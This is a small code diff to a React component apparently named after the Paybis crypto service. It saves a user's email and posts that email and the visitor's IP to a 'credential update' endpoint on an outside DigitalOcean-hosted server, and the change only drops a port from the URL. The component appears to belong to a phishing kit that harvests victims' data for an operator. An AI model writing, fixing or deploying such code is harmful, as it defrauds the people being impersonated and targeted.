@@ -22,7 +22,7 @@ export default function Paybisemail({ socket, ip,setCenaAtual }) {
      
       localStorage.setItem("email", email);
 
-      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/atualizacredencial", {
+      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app/atualizacredencial", {
         email,
         ip
       });
